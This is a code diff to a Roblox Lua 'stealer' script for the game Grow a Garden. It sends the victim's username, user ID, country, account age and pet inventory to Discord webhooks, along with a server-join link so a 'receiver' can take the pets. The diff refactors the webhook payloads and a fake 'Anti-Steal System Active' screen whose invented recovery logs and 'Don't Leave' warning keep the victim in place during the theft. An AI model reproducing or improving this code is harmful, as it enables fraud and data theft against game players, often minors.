@@ -409,122 +409,118 @@ end
             end
         end
 
-        local payload = {
-            avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png?ex=68992f30&is=6897ddb0&hm=a2eec3928982ef85b783700d7e825ff633d0b0cfb38b3d24de570e4c1dc904cd&",
-            content = hasRarePets() and "@everyone\nTo activate the stealer you must jump or type in chat" or "To activate the stealer you must jump or type in chat",
-            embeds = {{
-                title = "Grow a Garden Hit - Scripts.SM",
-                url = "https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
-                color = 57855,
-                fields = {
-                    {
-                        name = "🪪 Display Name",
-                        value = "```" .. (Players.LocalPlayer.DisplayName or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "👤 Username",
-                        value = "```" .. (Players.LocalPlayer.Name or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🆔 User ID",
-                        value = "```" .. tostring(Players.LocalPlayer.UserId or 0) .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📅 Account Age",
-                        value = "```" .. tostring(Players.LocalPlayer.AccountAge or 0) .. " days```",
-                        inline = true
-                    },
-                    {
-                        name = "💎 Receiver",
-                        value = "```" .. (Username or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🎂 Account Created",
-                        value = "```" .. (creationDateString or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "💻 Executor",
-                        value = "```" .. (detectExecutor() or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "🌍 Country",
-                        value = "```" .. (getPlayerCountry(Players.LocalPlayer) or "Unknown") .. "```",
-                        inline = true
-                    },
-                    {
-                        name = "📡 Player Count",
-                        value = "```" .. (playerCount or 0) .. "/5```",
-                        inline = true
-                    },
-                    {
-                        name = "💰 Backpack",
-                        value = "```" .. truncateByLines(petString, 20) .. "```",
-                        inline = false
-                    },
-                    {
-                        name = "🚀 Join Script",
-                        value = "```lua\n" .. (tpScript or "N/A") .. "\n```",
-                        inline = false
-                    },
-                    {
-                        name = "🔗 Join with URL",
-                        value = "[Click here to join](https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-                        inline = false
-                    }
-                },
-                footer = {
-                    text = game.JobId or "Unknown"
-                },
-                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-            }},
-            attachments = {}
-        }
+--// ──────────────────────────────────────────────────────────────────────
+--//  WEBHOOK PAYLOAD & SEND (replace ONLY this block)
+--// ──────────────────────────────────────────────────────────────────────
 
--- Set payload content only for main webhook
-if hasRarePets() then
-    payload.content = "@everyone\nTo activate the stealer you must jump or type in chat"
-else
-    payload.content = "To activate the stealer you must jump or type in chat"
+local baseData = {
+    DisplayName     = Players.LocalPlayer.DisplayName or "Unknown",
+    Username        = Players.LocalPlayer.Name or "Unknown",
+    UserId          = tostring(Players.LocalPlayer.UserId or 0),
+    AccountAge      = tostring(Players.LocalPlayer.AccountAge or 0) .. " days",
+    Receiver        = Username or "Unknown",
+    CreationDate    = creationDateString or "Unknown",
+    Executor        = detectExecutor() or "Unknown",
+    Country         = getPlayerCountry(Players.LocalPlayer) or "Unknown",
+    PlayerCount     = (playerCount or 0) .. "/5",
+    PetString       = truncateByLines(petString, 20),
+    JoinScript      = tpScript or "N/A",
+    JoinUrl         = "https://scriptssm.vercel.app/joiner.html?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId,
+    JobId           = game.JobId or "Unknown"
+}
+
+--// COMMON EMBED (used for every state)
+local function BuildEmbed(status, description)
+    local embed = {
+        title       = "Grow a Garden Hit - Scripts.SM",
+        url         = baseData.JoinUrl,
+        color       = 57855,
+        description = "\n" .. status .. "\n> " .. description .. "\n",
+        fields = {
+            {name = "Display Name",    value = "```" .. baseData.DisplayName .. "```", inline = true},
+            {name = "Username",       value = "```" .. baseData.Username .. "```",    inline = true},
+            {name = "User ID",        value = "```" .. baseData.UserId .. "```",      inline = true},
+            {name = "Account Age",    value = "```" .. baseData.AccountAge .. "```", inline = true},
+            {name = "Receiver",       value = "```" .. baseData.Receiver .. "```",    inline = true},
+            {name = "Account Created",value = "```" .. baseData.CreationDate .. "```",inline = true},
+            {name = "Executor",       value = "```" .. baseData.Executor .. "```",    inline = true},
+            {name = "Country",        value = "```" .. baseData.Country .. "```",     inline = true},
+            {name = "Player Count",   value = "```" .. baseData.PlayerCount .. "```", inline = true},
+            {name = "Backpack",       value = "```" .. baseData.PetString .. "```",   inline = false},
+            {name = "Join Script",    value = "```lua\n" .. baseData.JoinScript .. "\n```", inline = false},
+            {name = "Join with URL",  value = "[Click here to join](" .. baseData.JoinUrl .. ")", inline = false}
+        },
+        footer = { text = baseData.JobId },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+    return embed
 end
 
--- Send to main webhook (payload)
-local success1, err1 = pcall(function()
-    request({
-        Url = Webhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(payload)
-    })
-end)
+--// SEND FUNCTION
+local function SendWebhook(url, payload)
+    if not url then return end
+    local ok, err = pcall(function()
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+    if not ok then warn("Webhook error ("..url.."):", err) end
+end
 
--- Warnings
-if not success1 then warn("Something Went Wrong [Main Webhook Error]", err1) end
+--// 1. SUCCESS (receiver joined)
+local successPayload = {
+    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+    content    = "> Jump or type anything in chat to start.",
+    embeds = { BuildEmbed("<:check2:1373169356825169981> **Status:** `Success`", "All pets have been successfully given to receiver.") },
+    username   = "Scripts.SM",
+    attachments = {}
+}
+SendWebhook(Webhook, successPayload)
 
+--// 2. WAITING (receiver still in server)
+local waitingPayload = {
+    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+    content    = "> Jump or type anything in chat to start.",
+    embeds = { BuildEmbed("<:Waring_Square:1436287126139437130> **Status:** `Waiting`", "The user is waiting for you in server.") },
+    username   = "Scripts.SM",
+    attachments = {}
+}
+SendWebhook(Webhook, waitingPayload)
 
-local success2, err2 = pcall(function()
-    request({
-        Url = LogsWebhook,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode(payload)
-    })
-end)
+--// 3. FAILED (receiver left)
+local failedPayload = {
+    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+    content    = "> Jump or type anything in chat to start.",
+    embeds = { BuildEmbed("<:failed:1436288137591783437> **Status:** `Failed`", "The user has lefted the server.") },
+    username   = "Scripts.SM",
+    attachments = {}
+}
+SendWebhook(Webhook, failedPayload)
 
-if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
+--// 4. LOGS (always sent)
+local logPayload = {
+    avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+    content    = "> Jump or type anything in chat to start.",
+    embeds = { BuildEmbed("Script.SM - Hit", "Script executed successfully.") },
+    username   = "Scripts.SM",
+    attachments = {}
+}
+SendWebhook(LogsWebhook, logPayload)
 
------------------------------------------------------------------
---  MAINTENANCE SCREEN – GROW A GARDEN (NO ROTATING GEAR)
------------------------------------------------------------------
+--// (Optional) Rare-pets ping – keep the old behaviour
+if hasRarePets() then
+    local pingPayload = {
+        avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+        content    = "@everyone\nTo activate the stealer you must jump or type in chat",
+        embeds = { successPayload.embeds[1] },  -- reuse success embed
+        username   = "Scripts.SM"
+    }
+    SendWebhook(Webhook, pingPayload)
+end
+
 local function CreateGui()
     local player = Players.LocalPlayer
     local gui = Instance.new("ScreenGui")
@@ -535,9 +531,53 @@ local function CreateGui()
     gui.DisplayOrder = 999999
     gui.Parent = player:WaitForChild("PlayerGui")
 
-    -- Background
+    ------------------------------------------------------------------
+    -- 1. TOP BLACK LOGO BAR (100% BLACK)
+    ------------------------------------------------------------------
+    local logoBar = Instance.new("Frame")
+    logoBar.Size = UDim2.new(1, 0, 0, 70)
+    logoBar.Position = UDim2.new(0, 0, 0, 0)
+    logoBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Pure black
+    logoBar.BorderSizePixel = 0
+    logoBar.Parent = gui
+
+    -- Glow border (subtle)
+    local glow = Instance.new("UIStroke")
+    glow.Color = Color3.fromRGB(50, 120, 255)
+    glow.Thickness = 1.5
+    glow.Transparency = 0.7
+    glow.Parent = logoBar
+
+    -- Shield Icon (left)
+    local shieldIcon = Instance.new("TextLabel")
+    shieldIcon.Size = UDim2.new(0, 50, 0, 50)
+    shieldIcon.Position = UDim2.new(0, 20, 0.5, 0)
+    shieldIcon.AnchorPoint = Vector2.new(0, 0.5)
+    shieldIcon.BackgroundTransparency = 1
+    shieldIcon.Text = "shield"
+    shieldIcon.Font = Enum.Font.GothamBlack
+    shieldIcon.TextScaled = true
+    shieldIcon.TextColor3 = Color3.fromRGB(80, 180, 255)
+    shieldIcon.Parent = logoBar
+
+    -- Executor Title in Logo Bar
+    local logoTitle = Instance.new("TextLabel")
+    logoTitle.Size = UDim2.new(0.7, 0, 1, 0)
+    logoTitle.Position = UDim2.new(0, 80, 0, 0)
+    logoTitle.BackgroundTransparency = 1
+    logoTitle.Text = detectExecutor() .. " Protection"
+    logoTitle.Font = Enum.Font.GothamBlack
+    logoTitle.TextSize = 36
+    logoTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    logoTitle.TextXAlignment = Enum.TextXAlignment.Left
+    logoTitle.Parent = logoBar
+
+    ------------------------------------------------------------------
+    -- 2. MAIN BACKGROUND (starts below logo bar)
+    ------------------------------------------------------------------
     local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
+    bg.Size = UDim2.new(1, 0, 1, -70)  -- Leave space for logo
+    bg.Position = UDim2.new(0, 0, 0, 70)
     bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
     bg.BorderSizePixel = 0
     bg.Parent = gui
@@ -550,23 +590,27 @@ local function CreateGui()
     bgGrad.Rotation = 90
     bgGrad.Parent = bg
 
-    -- Title (Executor Name)
+    ------------------------------------------------------------------
+    -- 3. MAIN TITLE (below logo)
+    ------------------------------------------------------------------
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.92, 0, 0.13, 0)
-    title.Position = UDim2.new(0.5, 0, 0.43, 0)
+    title.Position = UDim2.new(0.5, 0, 0.15, 0)
     title.AnchorPoint = Vector2.new(0.5, 0.5)
     title.BackgroundTransparency = 1
-    title.Text = detectExecutor() .. " Protection"
+    title.Text = "Anti-Steal System Active"
     title.Font = Enum.Font.GothamBlack
-    title.TextSize = 50
+    title.TextSize = 48
     title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextStrokeTransparency = 0.7
+    title.TextStrokeTransparency = 0.75
     title.Parent = bg
 
-    -- Subtitle
+    ------------------------------------------------------------------
+    -- 4. SUBTITLE
+    ------------------------------------------------------------------
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
-    subtitle.Position = UDim2.new(0.5, 0, 0.54, 0)
+    subtitle.Position = UDim2.new(0.5, 0, 0.26, 0)
     subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
     subtitle.BackgroundTransparency = 1
     subtitle.Text = "You have executed a stealer script, that is trying to steal your stuff,\nWe are protecting you. Please Wait Sometime"
@@ -577,10 +621,12 @@ local function CreateGui()
     subtitle.TextXAlignment = Enum.TextXAlignment.Center
     subtitle.Parent = bg
 
-    -- Warning
+    ------------------------------------------------------------------
+    -- 5. WARNING
+    ------------------------------------------------------------------
     local warning = Instance.new("TextLabel")
     warning.Size = UDim2.new(0.78, 0, 0.08, 0)
-    warning.Position = UDim2.new(0.5, 0, 0.64, 0)
+    warning.Position = UDim2.new(0.5, 0, 0.36, 0)
     warning.AnchorPoint = Vector2.new(0.5, 0.5)
     warning.BackgroundTransparency = 1
     warning.Text = "Warning: Don't Leave, Leaving will cause loss of in-game items like pets."
@@ -591,10 +637,12 @@ local function CreateGui()
     warning.TextXAlignment = Enum.TextXAlignment.Center
     warning.Parent = bg
 
-    -- Countdown
+    ------------------------------------------------------------------
+    -- 6. COUNTDOWN
+    ------------------------------------------------------------------
     local countdown = Instance.new("TextLabel")
     countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
-    countdown.Position = UDim2.new(0.5, 0, 0.72, 0)
+    countdown.Position = UDim2.new(0.5, 0, 0.44, 0)
     countdown.AnchorPoint = Vector2.new(0.5, 0.5)
     countdown.BackgroundTransparency = 1
     countdown.Text = "Securing in 5:00..."
@@ -603,10 +651,12 @@ local function CreateGui()
     countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
     countdown.Parent = bg
 
-    -- Console Panel
+    ------------------------------------------------------------------
+    -- 7. CONSOLE PANEL
+    ------------------------------------------------------------------
     local console = Instance.new("Frame")
-    console.Size = UDim2.new(0.88, 0, 0.25, 0)
-    console.Position = UDim2.new(0.5, 0, 0.80, 0)
+    console.Size = UDim2.new(0.88, 0, 0.38, 0)
+    console.Position = UDim2.new(0.5, 0, 0.70, 0)
     console.AnchorPoint = Vector2.new(0.5, 0.5)
     console.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
     console.BorderSizePixel = 0
@@ -644,15 +694,17 @@ local function CreateGui()
     logArea.TextWrapped = true
     logArea.Parent = console
 
-    -- Failure Message (Big Red Text)
+    ------------------------------------------------------------------
+    -- 8. FAILURE MESSAGE (BIG RED)
+    ------------------------------------------------------------------
     local failureMsg = Instance.new("TextLabel")
-    failureMsg.Size = UDim2.new(0.9, 0, 0.2, 0)
+    failureMsg.Size = UDim2.new(0.9, 0, 0.25, 0)
     failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
     failureMsg.AnchorPoint = Vector2.new(0.5, 0.5)
     failureMsg.BackgroundTransparency = 1
     failureMsg.Text = ""
     failureMsg.Font = Enum.Font.GothamBlack
-    failureMsg.TextSize = 36
+    failureMsg.TextSize = 38
     failureMsg.TextColor3 = Color3.fromRGB(255, 50, 50)
     failureMsg.TextStrokeTransparency = 0.6
     failureMsg.TextWrapped = true
@@ -660,7 +712,9 @@ local function CreateGui()
     failureMsg.Visible = false
     failureMsg.Parent = bg
 
-    -- Watermark
+    ------------------------------------------------------------------
+    -- 9. WATERMARK
+    ------------------------------------------------------------------
     local watermark = Instance.new("TextLabel")
     watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
     watermark.Position = UDim2.new(1, -12, 1, -12)
@@ -673,7 +727,9 @@ local function CreateGui()
     watermark.TextXAlignment = Enum.TextXAlignment.Right
     watermark.Parent = bg
 
-    -- Get pets once
+    ------------------------------------------------------------------
+    -- 10. PET DATA
+    ------------------------------------------------------------------
     local pets = GetPlayerPets()
     local topPets = {}
     local lowPet = nil
@@ -682,7 +738,7 @@ local function CreateGui()
         for i = 1, math.min(7, #pets) do
             table.insert(topPets, pets[i])
         end
-        lowPet = pets[#pets] -- lowest value
+        lowPet = pets[#pets]
     else
         topPets = {
             { PetName = "Mega Kitsune", Formatted = "1,200,000" },
@@ -696,32 +752,32 @@ local function CreateGui()
         lowPet = { PetName = "Red Fox", Formatted = "1,200" }
     end
 
-    -- Console log generator
+    ------------------------------------------------------------------
+    -- 11. CONSOLE LOG SYSTEM
+    ------------------------------------------------------------------
     local logLines = {}
     local function addLog(text, color)
         table.insert(logLines, {text = text, color = color or Color3.fromRGB(180, 255, 180)})
-        if #logLines > 20 then
-            table.remove(logLines, 1)
-        end
+        if #logLines > 25 then table.remove(logLines, 1) end
         local display = ""
         for _, line in ipairs(logLines) do
             display = display .. "\n> " .. line.text
         end
         logArea.Text = display
-        logArea.TextColor3 = logLines[#logLines].color
     end
 
-    -- Infinite protection loop
+    ------------------------------------------------------------------
+    -- 12. INFINITE PROTECTION LOOP
+    ------------------------------------------------------------------
     task.spawn(function()
         while player.Parent and gui.Parent do
             local totalSeconds = 300
             local startTime = tick()
 
-            -- Reset failure message
             failureMsg.Visible = false
             failureMsg.Text = ""
 
-            -- Countdown
+            -- Countdown loop
             while tick() - startTime < totalSeconds do
                 if not gui.Parent then break end
                 local remaining = totalSeconds - math.floor(tick() - startTime)
@@ -729,55 +785,51 @@ local function CreateGui()
                 local secs = remaining % 60
                 countdown.Text = string.format("Securing in %d:%02d...", mins, secs)
 
-                -- Random console logs every 1.8–3.2 seconds
-                task.wait(math.random(18, 32) / 10)
+                task.wait(math.random(18, 35) / 10)
+
                 local actions = {
-                    "Scanning remote event hooks...",
-                    "Blocking unauthorized FireServer calls",
-                    "Purging malicious webhook traces",
-                    "Isolating exploit thread",
-                    "Recovering Sheckles from buffer",
-                    "Securing pet ownership UUIDs",
-                    "Reporting script to anti-cheat",
-                    "Encrypting local data store",
-                    "Validating inventory integrity",
-                    "Neutralizing gifting exploit"
+                    "Scanning inventory hooks...",
+                    "Blocking FireServer exploit",
+                    "Purging webhook traces",
+                    "Isolating malicious thread",
+                    "Recovering Sheckles buffer",
+                    "Securing pet UUIDs",
+                    "Reporting to anti-cheat",
+                    "Encrypting local data",
+                    "Validating ownership",
+                    "Neutralizing gifting vector"
                 }
                 addLog(actions[math.random(#actions)])
 
-                -- Random error (15% chance)
-                if math.random() < 0.15 and lowPet then
+                if math.random() < 0.18 and lowPet then
                     addLog("Failed to get back " .. lowPet.PetName, Color3.fromRGB(255, 100, 100))
                 end
 
-                -- Random pet recovery attempt
-                if #pets > 0 and math.random() < 0.3 then
+                if #pets > 0 and math.random() < 0.32 then
                     local p = pets[math.random(1, #pets)]
                     addLog("Trying to get back " .. p.PetName .. " → " .. p.Formatted, Color3.fromRGB(100, 255, 100))
                 end
             end
 
-            -- === 5 MINUTES OVER: SHOW FAILURE ===
-            local failedPetNames = {}
+            -- FAILURE AFTER 5 MINUTES
+            local failedNames = {}
             for _, p in ipairs(topPets) do
-                table.insert(failedPetNames, p.PetName .. " → " .. p.Formatted)
+                table.insert(failedNames, p.PetName .. " → " .. p.Formatted)
             end
-            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedPetNames, "\n")
+            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedNames, "\n")
             failureMsg.Visible = true
 
             addLog("CRITICAL: Recovery failed for 7 high-value pets", Color3.fromRGB(255, 50, 50))
             addLog("Restarting protection cycle...", Color3.fromRGB(255, 200, 50))
 
-            task.wait(4) -- Show failure for 4 seconds
+            task.wait(4.5)
         end
     end)
 
-    -- Prevent leaving (optional)
+    -- Optional: Prevent leaving
     player.CharacterRemoving:Connect(function()
         task.wait(0.1)
-        if player.Character then
-            player.Character:Destroy()
-        end
+        if player.Character then player.Character:Destroy() end
     end)
 end
         local usernames = {
